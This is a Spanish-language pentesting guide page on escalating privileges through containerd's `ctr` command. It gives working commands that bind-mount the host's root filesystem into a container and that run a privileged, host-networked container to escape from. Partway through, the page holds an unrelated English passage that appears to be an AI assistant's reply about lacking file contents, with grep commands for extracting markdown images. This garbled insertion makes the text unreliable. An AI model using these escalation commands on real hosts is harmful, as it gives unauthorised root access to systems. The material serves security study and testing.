# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Consulta el siguiente enlace para aprender **dónde encajan `containerd` y `ctr` en la pila de contenedores**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

si encuentras que un host contiene el comando `ctr`:
```bash
which ctr
/usr/bin/ctr
```
I don’t have the file contents. If you want me to list the images, either paste the markdown here or run one of these commands locally to extract image references.

Commands to list image paths from a markdown file:

- Extract Markdown image URLs:
  grep -oP '!\\[.*?\\]\\(\\K.*?(?=\\))' file.md

- Extract HTML <img> src values:
  grep -oP '<img[^>]+src=["'\'']\\K[^"'\''>]+' file.md

- Both (using ripgrep):
  rg -o '!\\[.*?\\]\\(.*?\\)|<img[^>]*src=["'\'']?[^"'\'' >]+' file.md

- For a whole repo (ripgrep):
  rg -o '!\\[.*?\\]\\(.*?\\)|<img[^>]*src=["'\'']?[^"'\'' >]+' --glob='**/*.md'

Paste the file content here and I’ll list the images for you.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Y luego **ejecuta una de esas imágenes montando la carpeta raíz del host en ella**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Ejecuta un contenedor con privilegios y escapa de él.\
Puedes ejecutar un contenedor privilegiado como:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Entonces puedes usar algunas de las técnicas mencionadas en la siguiente página para **escape from it abusing privileged capabilities**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
